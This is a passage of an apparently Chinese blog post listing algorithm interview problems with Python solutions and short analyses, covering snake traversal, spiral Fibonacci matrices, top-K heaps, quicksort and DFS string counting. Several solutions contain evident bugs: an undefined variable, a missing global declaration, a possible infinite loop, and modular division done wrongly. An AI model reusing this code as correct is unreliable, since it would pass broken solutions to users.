class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>      </td>      <td class="code">        <pre><span class="line">n = int(input())</span><br><span class="line">ret = 0</span><br><span class="line">def C(n, i):</span><br><span class="line">    ret = 1</span><br><span class="line">    d = 1</span><br><span class="line">    while i &gt; 0:</span><br><span class="line">        ret *= n % (pow(10, 9) + 7)</span><br><span class="line">        n -= 1</span><br><span class="line">        d *= i % (pow(10, 9) + 7)</span><br><span class="line">        i -= 1</span><br><span class="line">    return int(ret/ d) % (pow(10, 9) + 7)</span><br><span class="line">for i in range(1, n + 1):</span><br><span class="line">    ret += (i * C(n, i)) % (pow(10, 9) + 7)</span><br><span class="line">print(ret % (pow(10, 9) + 7))</span><br></pre>      </td>    </tr>  </table></figure><h2 id="分析-v5">分析</h2><p>全组合可以通过转化成2进制，然后数1的个数来确定，也可以使用从1到n组合求和来做。</p><h1>求图中链接相同元素的节点对的数量</h1><blockquote>  <p>Input: 节点数n，边数m；以后m行，m条边。</p></blockquote><blockquote>  <p>Output: 链接相同元素的节点对的数量</p></blockquote><h2 id="代码-v7">代码</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre>      </td>      <td class="code">        <pre><span class="line">line = input().split(&apos; &apos;)</span><br><span class="line">n = int(line[0])</span><br><span class="line">m = int(line[1])</span><br><span class="line">matrix = [[0 for i in range(n + 1)] for j in range(n + 1)]</span><br><span class="line">for i in range(m):</span><br><span class="line">    tmp = input().split(&apos; &apos;)</span><br><span class="line">    matrix[int(tmp[0])][int(tmp[1])] = 1</span><br><span class="line">    matrix[int(tmp[1])][int(tmp[0])] = 1</span><br><span class="line">def Equal(list1, list2, n):</span><br><span class="line">    flag = True</span><br><span class="line">    for i in range(1, n + 1):</span><br><span class="line">        if list1[i] != list2[i]:</span><br><span class="line">            flag = False</span><br><span class="line">    return flag</span><br><span class="line">ret = 0</span><br><span class="line">for i in range(1, n + 1):</span><br><span class="line">    for j in range(i + 1, n + 1):</span><br><span class="line">        if Equal(matrix[i], matrix[j], n):</span><br><span class="line">            ret += 1</span><br><span class="line">print(ret)</span><br></pre>      </td>    </tr>  </table></figure><h2 id="分析-v6">分析</h2><p>我这里用了一种最笨的方法，将图存成邻接矩阵，然后两行完全相同（不包含全为0），则代表他们链接的节点相同。</p><h1>蛇形输出</h1><blockquote>  <p>蛇形输出或者蛇形赋值在很多地方都出现了，在此提供一个模板。</p></blockquote><h2 id="代码-v8">代码</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre>      </td>      <td class="code">        <pre><span class="line">def Right(i, j, right_end, bottom_end, ret, matrix):</span><br><span class="line">    if j == right_end and i &lt; bottom_end:</span><br><span class="line">        return Down(i, j, right_end, bottm_end, ret, matrix)</span><br><span class="line">    elif j == right_end and i == bottom_end:</span><br><span class="line">        return </span><br><span class="line">    else:</span><br><span class="line">        ret.append(matrix[i][j + 1])</span><br><span class="line">        if i == bottom_end:</span><br><span class="line">            return RightUp(i, j + 1, right_end, bottom_end, ret, matrix)</span><br><span class="line">        else:</span><br><span class="line">            return LeftDown(i, j + 1, right_end, bottom_end, ret, matrix)</span><br><span class="line">def Down(i, j, right_end, bottom_end, ret, matrix):</span><br><span class="line">    if i == bottom_end and j == right_end:</span><br><span class="line">        return</span><br><span class="line">    elif i == bottom_end and j &lt; right_end:</span><br><span class="line">        Right(i, j, right_end, bottom_end, ret, matrix)</span><br><span class="line">    else:</span><br><span class="line">        ret.append(matrix[i + 1][j])</span><br><span class="line">        if j == right_end:</span><br><span class="line">            return LeftDown(i + 1, j, right_end, bottom_end, ret, matrix)</span><br><span class="line">        else:</span><br><span class="line">            return RightUp(i + 1, j, right_end, bottom_end, ret, matrix)</span><br><span class="line">def LeftDown(i, j, right_end, bottom_end, ret, matrix):</span><br><span class="line">    if i == bottom_end and j == right_end:</span><br><span class="line">        return</span><br><span class="line">    elif i == bottom_end:</span><br><span class="line">        return Right(i, j, right_end, bottom_end, ret, matrix)</span><br><span class="line">    elif j == 0:</span><br><span class="line">        return Down(i, j, right_end, bottom_end, ret, matrix)</span><br><span class="line">    else:</span><br><span class="line">        ret.append(matrix[i + 1][j - 1])</span><br><span class="line">        return LeftDown(i + 1, j - 1, right_end, bottom_end, ret, matrix)</span><br><span class="line">def RightUp(i, j, right_end, bottom_end, ret, matrix):</span><br><span class="line">    if i == bottom_end and j == right_end:</span><br><span class="line">        return</span><br><span class="line">    elif j == right_end:</span><br><span class="line">        return Down(i, j, right_end, bottom_end, ret, matrix)</span><br><span class="line">    elif i == 0:</span><br><span class="line">        return Right(i, j, right_end, bottom_end, ret, matrix)</span><br><span class="line">    else:</span><br><span class="line">        ret.append(matrix[i - 1][j + 1])</span><br><span class="line">        return RightUp(i - 1, j + 1, right_end, bottom_end, ret, matrix)</span><br><span class="line">n = int(input())</span><br><span class="line">matrix = [[str(j) + &apos;+&apos; + str(i) for i in range(n)] for j in range(n)]        </span><br><span class="line">ret = []</span><br><span class="line">ret.append(matrix[0][0])</span><br><span class="line">Down(0, 0, n - 1, n - 1, ret, matrix)</span><br><span class="line">print(ret)</span><br></pre>      </td>    </tr>  </table></figure><h1>子串长度</h1><blockquote>  <p>Input: 只包含小写字母的字符串。</p></blockquote><blockquote>  <p>Output: 包含连续两个“abcde”或者不包含“abcde”的子串最长长度。</p></blockquote><h2 id="代码-v9">代码</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre>      </td>      <td class="code">        <pre><span class="line">strs = input()</span><br><span class="line">chars = &apos;abcde&apos;</span><br><span class="line">dp = [0 for i in range(len(strs) + 1)]</span><br><span class="line">for i in range(len(strs)):</span><br><span class="line">    if strs[i] not in chars:</span><br><span class="line">        dp[i + 1] = dp[i] + 1</span><br><span class="line">    else:</span><br><span class="line">        if i == 0:</span><br><span class="line">            dp[i + 1] = dp[i]</span><br><span class="line">        elif strs[i] == strs[i - 1]:</span><br><span class="line">            dp[i + 1] = dp[i - 1] + 2</span><br><span class="line">        else:</span><br><span class="line">            dp[i + 1] = 0</span><br><span class="line">max = 0</span><br><span class="line">for i in range(len(strs) + 1):</span><br><span class="line">    if dp[i] &gt; max:</span><br><span class="line">        max = dp[i]</span><br><span class="line">print(max)</span><br></pre>      </td>    </tr>  </table></figure><h1>字符串分割相等</h1><blockquote>  <p>Input: &quot;,&quot;分隔的两个字符串。</p></blockquote><blockquote>  <p>Output: 如果两个字符串相同或者分隔成子串相同，则输出“true”，否则输出“false”。</p></blockquote><h2 id="代码-v10">代码</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre>      </td>      <td class="code">        <pre><span class="line">line = input().split(&apos;,&apos;)</span><br><span class="line">str1 = line[0]</span><br><span class="line">str2 = line[1]</span><br><span class="line">def Equal(str1, str2):</span><br><span class="line">    if len(str1) != len(str2):</span><br><span class="line">        return False</span><br><span class="line">    elif len(str1) == 1 and str1 != str2:</span><br><span class="line">        return False</span><br><span class="line">    elif str1 == str2:</span><br><span class="line">        return True</span><br><span class="line">    elif len(str1) % 2 == 1:</span><br><span class="line">        return Equal(str1[0: int(len(str1) / 2)], str2[int(len(str2) / 2) - 1:]) and Equal(str2[0: int(len(str2) / 2) - 1], str1[int(len(str1) / 2):]) or (Equal(str1[0: int(len(str1) / 2) - 1], str2[int(len(str2) / 2):]) and Equal(str2[0: int(len(str2) / 2)], str1[int(len(str1) / 2) - 1:]))</span><br><span class="line">    else:</span><br><span class="line">        return Equal(str1[0: int(len(str1) / 2)], str2[int(len(str2) / 2):]) and Equal(str2[0: int(len(str2) / 2)], str1[int(len(str1) / 2):]) </span><br><span class="line">if Equal(str1, str2):</span><br><span class="line">    print(&apos;true&apos;)</span><br><span class="line">else:</span><br><span class="line">    print(&apos;false&apos;)</span><br></pre>      </td>    </tr>  </table></figure><h2 id="分析-v7">分析</h2><p>递归的思想，如果当前串相同则返回True，否则将串二等分，看子串是否相等。</p><h1>杨辉三角</h1><blockquote>  <p>Input: 行数n；每一行有2 × i - 1个数字，构成一个三角形。</p></blockquote><blockquote>  <p>Output: 从第一行走到最后一行最大的和。</p></blockquote><h2 id="代码-v11">代码</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>      </td>      <td class="code">        <pre><span class="line">n = int(input().strip())</span><br><span class="line">matrix = [[0 for i in range(2 * n + 1)] for j in range(n + 1)]</span><br><span class="line">for i in range(1, n + 1):</span><br><span class="line">    line = input().split(&apos; &apos;)</span><br><span class="line">    for j in range(n + 1 - i, n + 1 - i + len(line)):</span><br><span class="line">        matrix[i][j] = int(line[j - n + i - 1])</span><br><span class="line">dp = [[0 for i in range(2 * n + 1)] for j in range(n + 1)]</span><br><span class="line">for i in range(1, n + 1):</span><br><span class="line">    for j in range(1, 2 * n):</span><br><span class="line">        if i == 1:</span><br><span class="line">            dp[i][j] = matrix[i][j]</span><br><span class="line">        else:</span><br><span class="line">            dp[i][j] = max(dp[i - 1][j - 1], dp[i - 1][j], dp[i - 1][j + 1]) + matrix[i][j]</span><br><span class="line">print(max(dp[-1]))</span><br></pre>      </td>    </tr>  </table></figure><h2 id="分析-v8">分析</h2><p>比较经典的动态规划题。动态规划与递归的区别在于动态规划利用“最优子结构”这个特性，所以下一个状态由上一个状态推出，写代码时是从头往后，而递归则是从后往前。</p><h1>回字形写入斐波拉契数列</h1><blockquote>  <p>Input: 矩阵的边长n。</p></blockquote><blockquote>  <p>Output: 回字形写入斐波拉契数列的<code>n × n</code>矩阵。</p></blockquote><h2 id="代码-v12">代码</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre>      </td>      <td class="code">        <pre><span class="line">def Trans(matrix):</span><br><span class="line">    if len(matrix) == 0:</span><br><span class="line">        return</span><br><span class="line">    new_matrix = []</span><br><span class="line">    tmp_line = []</span><br><span class="line">    for j in range(len(matrix[0]) - 1, -1, -1):</span><br><span class="line">        tmp_line = []</span><br><span class="line">        for i in range(len(matrix)):</span><br><span class="line">            tmp_line.append(matrix[i][j])</span><br><span class="line">        new_matrix.append(tmp_line)</span><br><span class="line">    return new_matrix</span><br><span class="line">ret = []</span><br><span class="line">def ReadLine(matrix):</span><br><span class="line">    if len(matrix) &gt; 1:</span><br><span class="line">        ret.append(matrix[0])</span><br><span class="line">        return ReadLine(Trans(matrix[1:]))</span><br><span class="line">    elif len(matrix) == 1:</span><br><span class="line">        ret.append(matrix[0])</span><br><span class="line">    else:</span><br><span class="line">        return</span><br><span class="line">n = int(input()) </span><br><span class="line">matrix = [[&apos;&apos; for i in range(n)] for j in range(n)]</span><br><span class="line">for i in range(n):</span><br><span class="line">    for j in range(n):</span><br><span class="line">        matrix[i][j] = str(i) + &apos;+&apos; + str(j)</span><br><span class="line">ReadLine(matrix) </span><br><span class="line">m = n * n</span><br><span class="line">def FB(m):</span><br><span class="line">    fb_arr = []</span><br><span class="line">    fb_arr.append(0)</span><br><span class="line">    for i in range(1, m + 1):</span><br><span class="line">        if i == 1 or i == 2:</span><br><span class="line">            fb_arr.append(1)</span><br><span class="line">        else:</span><br><span class="line">            fb_arr.append(fb_arr[i - 2] + fb_arr[i - 1])</span><br><span class="line">    return fb_arr</span><br><span class="line">fb_arr = FB(m)[::-1]</span><br><span class="line">ret_matrix = [[0 for i in range(n)] for j in range(n)]</span><br><span class="line">for i in range(len(ret)):</span><br><span class="line">    for j in range(len(ret[i])):</span><br><span class="line">        tmp = ret[i][j].split(&apos;+&apos;)</span><br><span class="line">        t = int(tmp[0])</span><br><span class="line">        k = int(tmp[1])</span><br><span class="line">        ret_matrix[t][k] = fb_arr[0]</span><br><span class="line">        fb_arr = fb_arr[1:]</span><br><span class="line">print(ret_matrix)</span><br></pre>      </td>    </tr>  </table></figure><h2 id="分析-v9">分析</h2><p>回字形输出，等价于先输出矩阵第一行，然后将矩阵旋转（这个时候之前的最右列就变成了第一行）再输出，往复到矩阵为空。</p><h1>前K大的数</h1><blockquote>  <p>求一堆数中前K大的数。 一般可以使用小顶堆来实现。用数组保存堆的时候：左子树 = 父节点 × 2；右子树 = 父节点 × 2 + 1。</p></blockquote><h2 id="代码-v13">代码</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre>      </td>      <td class="code">        <pre><span class="line">k = 4</span><br><span class="line">k_tree = [-1 for i in range(0, k + 1)]</span><br><span class="line">def FindLeft(root):</span><br><span class="line">    if root * 2 &lt;= k:</span><br><span class="line">        return root * 2</span><br><span class="line">    return -1</span><br><span class="line">def FindRight(root):</span><br><span class="line">    if root * 2 &lt;= k - 1:</span><br><span class="line">        return root * 2 + 1</span><br><span class="line">    return -1</span><br><span class="line">def BuildTree(val, root):</span><br><span class="line">    if val &lt;= k_tree[root]:</span><br><span class="line">        return</span><br><span class="line">    else:</span><br><span class="line">        swap(val, root)</span><br><span class="line">def swap(val, root):</span><br><span class="line">    if FindLeft(root) != -1 and val &lt;= k_tree[FindLeft(root)]:</span><br><span class="line">        k_tree[root] = val</span><br><span class="line">    elif FindRight(root) != -1 and val &gt;= k_tree[FindRight(root)]:</span><br><span class="line">        k_tree[root] = k_tree[FindRight(root)]</span><br><span class="line">        k_tree[FindRight(root)] = val</span><br><span class="line">        swap(k_tree[root], root)</span><br><span class="line">        swap(val, FindRight(root))</span><br><span class="line">    elif FindLeft(root) != -1 and FindRight(root) != -1 and val &gt; k_tree[FindLeft(root)] and val &lt; k_tree[FindRight(root)]:</span><br><span class="line">        k_tree[root] = k_tree[FindLeft(root)]</span><br><span class="line">        k_tree[FindLeft(root)] = val</span><br><span class="line">        swap(val, FindLeft(root))</span><br><span class="line">    elif FindLeft(root) != -1 and FindRight(root) == -1 and val &gt;= k_tree[FindLeft(root)]:</span><br><span class="line">        k_tree[root] = k_tree[FindLeft(root)]</span><br><span class="line">        k_tree[FindLeft(root)] = val</span><br><span class="line">        swap(val, FindLeft(root))</span><br><span class="line">for i in [12,32,53,45,6,7,6,8,9,9,324,6,5,4]:</span><br><span class="line">    BuildTree(i, 1)</span><br><span class="line">    print(k_tree)</span><br></pre>      </td>    </tr>  </table></figure><h1>两个有序的整数列表合并</h1><blockquote>  <p>简单版的归并排序。</p></blockquote><h2 id="代码-v14">代码</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre>      </td>      <td class="code">        <pre><span class="line">def Sort(list1, list2):</span><br><span class="line">    ret_list = []</span><br><span class="line">    len1 = len(list1)</span><br><span class="line">    len2 = len(list2)</span><br><span class="line">    idx1 = idx2 = 0</span><br><span class="line">    while idx1 &lt; len1 or idx2 &lt; len2:</span><br><span class="line">        if idx1 &gt;= len1:</span><br><span class="line">            ret_list.append(list2[idx2])</span><br><span class="line">            idx2 += 1</span><br><span class="line">        elif idx2 &gt;= len2:</span><br><span class="line">            ret_list.append(list1[idx1])</span><br><span class="line">            idx1 += 1</span><br><span class="line">        elif list1[idx1] &lt; list2[idx2]:</span><br><span class="line">            ret_list.append(list1[idx1])</span><br><span class="line">            idx1 += 1</span><br><span class="line">        else:</span><br><span class="line">            ret_list.append(list2[idx2])</span><br><span class="line">            idx2 += 1</span><br><span class="line">    return ret_list</span><br><span class="line">list1 = [1,2,5,6,7,32,44]</span><br><span class="line">list2 = [32,43,45,56,767]</span><br><span class="line">print(Sort(list1, list2))</span><br></pre>      </td>    </tr>  </table></figure><h1>快速排序</h1><blockquote>  <p>快速排序作为排序的代表，原型或者其变型经常被考察。</p></blockquote><h2 id="代码-v15">代码</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre>      </td>      <td class="code">        <pre><span class="line">def quick_sort(array, left, right):</span><br><span class="line">    if left &gt;= right:</span><br><span class="line">        return</span><br><span class="line">    low = left</span><br><span class="line">    high = right</span><br><span class="line">    key = array[left]</span><br><span class="line">    while left &lt; right:</span><br><span class="line">        if left &lt; right and array[right] &gt; key:</span><br><span class="line">            right -= 1</span><br><span class="line">        array[left] = array[right]</span><br><span class="line">        if left &lt; right and array[left] &lt;= key:</span><br><span class="line">            left += 1</span><br><span class="line">        array[right] = array[left]</span><br><span class="line">    array[left] = key</span><br><span class="line">    quick_sort(array, low, left - 1)</span><br><span class="line">    quick_sort(array, left + 1, high)</span><br><span class="line">array = [1,4,2,3,45,46,6,57,68,79,98,223]</span><br><span class="line">quick_sort(array, 0, len(array) - 1)</span><br><span class="line">print(array)</span><br></pre>      </td>    </tr>  </table></figure><h1>矩阵查找</h1><blockquote>  <p>一个行、列都递增的矩阵中查找某个数。</p></blockquote><h2 id="代码-v16">代码</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre>      </td>      <td class="code">        <pre><span class="line">def solution(matrix, target):</span><br><span class="line">    if not matrix:</span><br><span class="line">        return False</span><br><span class="line">    if not matrix[0]:</span><br><span class="line">        return False     </span><br><span class="line">    if target &gt; matrix[-1][-1] or target &lt; matrix[0][0]:</span><br><span class="line">        return False</span><br><span class="line">    j = 0</span><br><span class="line">    i = len(matrix) - 1</span><br><span class="line">    while True:                    </span><br><span class="line">        if i &lt; 0 or j &lt; 0 or i &gt;= len(matrix) or j &gt;= len(matrix[0]):</span><br><span class="line">            return False</span><br><span class="line">        if matrix[i][j] &gt; target:</span><br><span class="line">            i -= 1</span><br><span class="line">        elif matrix[i][j] &lt; target:</span><br><span class="line">            j += 1</span><br><span class="line">        else:</span><br><span class="line">            return True</span><br></pre>      </td>    </tr>  </table></figure><h1>连续不为0的区间和最大</h1><blockquote>  <p>Input: 数组长度n；数组的n个值；m个不同分割下标。</p></blockquote><blockquote>  <p>Output: 分别输出m个以对应下标分割的子区间的连续不为0的最大和。</p></blockquote><h2 id="代码-v17">代码</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre>      </td>      <td class="code">        <pre><span class="line">n = int(input())</span><br><span class="line">line2 = input().split(&apos; &apos;)</span><br><span class="line">line3 = input().split(&apos; &apos;)</span><br><span class="line">line = [0 for i in range(n + 1)]</span><br><span class="line">for i in range(n):</span><br><span class="line">    line[i + 1] = int(line2[i])</span><br><span class="line">def BIG(sep, line):</span><br><span class="line">    line[sep] = 0</span><br><span class="line">    ret_sep = []</span><br><span class="line">    tmp = 0</span><br><span class="line">    for i in range(n + 1):</span><br><span class="line">        if line[i] == 0:</span><br><span class="line">            ret_sep.append(tmp)</span><br><span class="line">            tmp = 0</span><br><span class="line">        else:</span><br><span class="line">            tmp += line[i]</span><br><span class="line">    ret_sep.append(tmp)</span><br><span class="line">    max = 0</span><br><span class="line">    for item in ret_sep:</span><br><span class="line">        if item &gt; max:</span><br><span class="line">            max = item</span><br><span class="line">    return max</span><br><span class="line">for i in range(n):</span><br><span class="line">    sep = int(line3[i])</span><br><span class="line">    print(BIG(sep, line))</span><br></pre>      </td>    </tr>  </table></figure><h1>矩阵中“CHINA”的个数</h1><blockquote>  <p>Input: 矩阵大小n，以及<code>n × n</code>的字符矩阵。</p></blockquote><blockquote>  <p>Output: &quot;CHINA&quot;的个数。</p></blockquote><h2 id="代码-v18">代码</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre>      </td>      <td class="code">        <pre><span class="line">n = int(input())</span><br><span class="line">n_lines = []</span><br><span class="line">for i in range(n):</span><br><span class="line">    n_lines.append(input()) </span><br><span class="line">china_num = 0</span><br><span class="line">arr_i = [1, -1, 0, 0]</span><br><span class="line">arr_j = [0, 0, 1, -1]</span><br><span class="line">def DFS(i, j, len):</span><br><span class="line">    if len == 5:</span><br><span class="line">        china_num += 1</span><br><span class="line">    else:</span><br><span class="line">        for t in range(4):</span><br><span class="line">            new_i = i + arr_i[t]</span><br><span class="line">            new_j = j + arr_j[t]</span><br><span class="line">            if new_i &gt;= 0 and new_j &gt;= 0 and new_i &lt; n and new_j &lt; n:</span><br><span class="line">                if len == 1 and n_lines[new_i][new_j] == &apos;H&apos;:</span><br><span class="line">                    DFS(new_i, new_j, len + 1)</span><br><span class="line">                elif len == 2 and n_lines[new_i][new_j] == &apos;I&apos;:</span><br><span class="line">                    DFS(new_i, new_j, len + 1)</span><br><span class="line">                elif len == 3 and n_lines[new_i][new_j] == &apos;N&apos;:</span><br><span class="line">                    DFS(new_i, new_j, len + 1)</span><br><span class="line">                elif len == 4 and n_lines[new_i][new_j] == &apos;A&apos;:</span><br><span class="line">                    DFS(new_i, new_j, len + 1)</span><br><span class="line">for i in range(n):</span><br><span class="line">    for j in range(len(n_lines[i])):</span><br><span class="line">        if n_lines[i][j] == &apos;C&apos;:</span><br><span class="line">            DFS(i, j, 1)</span><br><span class="line">print(china_num)</span><br></pre>      </td>    </tr>  </table></figure><h2 id="分析-v10">分析</h2><p>在矩阵中可以上下左右组合的字符串或者递增子序列之类的问题，都可以使用DFS来做。</p><h1>字符串中“Good”的数量</h1><blockquote>  <p>Input: 字符串。</p></blockquote><blockquote>  <p>Output: Good的数量</p></blockquote><h2 id="代码-v19">代码</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre>      </td>      <td class="code">        <pre><span class="line">line = input().strip()</span><br><span class="line">mark = [0 for i in range(len(line))]</span><br><span class="line">ret = 0</span><br><span class="line">for i in range(len(line)):</span><br><span class="line">    if line[i] == &apos;G&apos;:</span><br><span class="line">        mark[i] = 1</span><br><span class="line">        j = i</span><br><span class="line">        o_count = 0</span><br><span class="line">        d_count = 0</span><br><span class="line">        while j &lt; len(line) and o_count &lt; 2:</span><br><span class="line">            if line[j] == &apos;o&apos; and mark[j] == 0:</span><br><span class="line">                o_count += 1</span><br><span class="line">                mark[j] = 1</span><br><span class="line">                j += 1</span><br><span class="line">        if o_count == 2:</span><br><span class="line">            while j &lt; len(line) and d_count &lt; 1:</span><br><span class="line">                if line[j] == &apos;d&apos; and mark[j] == 0:</span><br><span class="line">                    d_count += 1</span><br><span class="line">                    j += 1</span><br><span class="line">            if d_count == 1:</span><br><span class="line">                ret += 1</span><br><span class="line">            else:</span><br><span class="line">                break</span><br><span class="line">        else:</span><br><span class="line">            break</span><br><span class="line">print(ret)</span><br></pre>      </td>    </tr>  </table></figure><h2 